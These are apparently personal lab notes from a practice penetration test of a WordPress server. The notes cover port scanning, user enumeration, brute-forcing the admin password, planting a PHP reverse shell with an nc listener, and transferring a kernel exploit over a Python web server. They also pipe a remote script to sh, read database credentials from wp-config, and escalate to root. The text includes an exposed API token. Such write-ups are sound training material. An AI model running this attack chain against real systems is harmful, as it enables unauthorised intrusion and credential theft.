Given IP 192.168.172.50

rustscan 192.168.172.50
	21/tcp open  ftp     syn-ack
	22/tcp open  ssh     syn-ack
	80/tcp open  http    syn-ack

sudo nmap -p21,22,80 -sC -sV -oN services.nmap 192.168.172.50 -v
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	| ftp-syst:
	|   STAT:
	| FTP server status:
	|      Connected to ::ffff:192.168.45.172
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 1
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
	|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
	|_  256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	| http-robots.txt: 1 disallowed entry
	|_Hackers
	| http-methods:
	|_  Supported Methods: OPTIONS GET HEAD POST
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Found wordpress
![[Pasted image 20231104091022.png]]
http://192.168.172.50/wordpress/

WP Scan since I found wordpress
	wpscan --url http://192.168.172.50/wordpress/ -e -t 20 -v  --force --api-token Sy5tZcHbYUJyHJbw6TbZBNqiyIO9copNXdF6Zkzh3cg -o WPScan.txt
		[i] User(s) Identified:
		[+] btrisk
		 | Found By: Author Posts - Display Name (Passive Detection)
		 | Confirmed By:
		 |  Rss Generator (Passive Detection)
		 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
		[+] admin
		 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
		 | Confirmed By: Login Error Messages (Aggressive Detection)

Now password attack on the users 
	wpscan --url http://192.168.172.50/wordpress/ -t 20 -v  --force -U btrisk,admin -P /usr/share/wordlists/rockyou.txt
		[+] Performing password attack on Xmlrpc Multicall against 2 user/s
		[SUCCESS] - admin / admin
		Progress Time: 00:01:38 <
	Also could have guesses the default password of admin too

![[Pasted image 20231104092855.png]] 

In wordpress dashboard modify a page with a reverse php shell from pentest monkey since wordpress is php
![[Pasted image 20231104093329.png]]

Prep the revshell
	hostname -I
		192.168.45.172
	nc -nlvp 4444
# Access

Got connection

![[Pasted image 20231104094512.png]]
Local user flag
d8b809bb138bef098be1f5c3162a2f78

# Priv Esc

Now Linpeas
	curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
		curl isn't on the system


Found kernel local priv esc due to old ubuntu
![[Pasted image 20231104095532.png]]

Need to compile and sent to target
	42275.c had a compiulation error so I'll use /usr/share/exploitdb/exploits/linux_x86/local/42276.c
	gcc 42276.c -o privesc
		Works
	now python server
		python -m http.server 80
			Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
	On Target
		wget http://192.168.45.172/privesc
			$ pwd
			/tmp
			$ ls
			privesc
			systemd-private-20fdaf2d5e444caa977c78273a05e50a-systemd-timesyncd.service-2gZKlK
			vmware-root
			$
		Can't run on target due to library mismatch


transferred linpeas though and ran
	╔══════════╣ Analyzing Wordpress Files (limit 70)
	-rw-rw-r-- 1 btrisk 1000 3441 Apr 24  2017 /var/www/html/wordpress/wp-config.php  
	define('DB_NAME', 'wordpress');
	define('DB_USER', 'root');
	define('DB_PASSWORD', 'rootpassword!');
	define('DB_HOST', 'localhost');


Database for wordpress is mySQL

crackstation for the hash


www-data@ubuntu:/tmp$ su root
su root
Password: roottoor

root@ubuntu:/tmp# cd /root
cd /root
root@ubuntu:~# ls
ls
proof.txt
root@ubuntu:~# cat proof.txt
cat proof.txt
c0af771a625bd503335ce68b1567e52c
root@ubuntu:~#
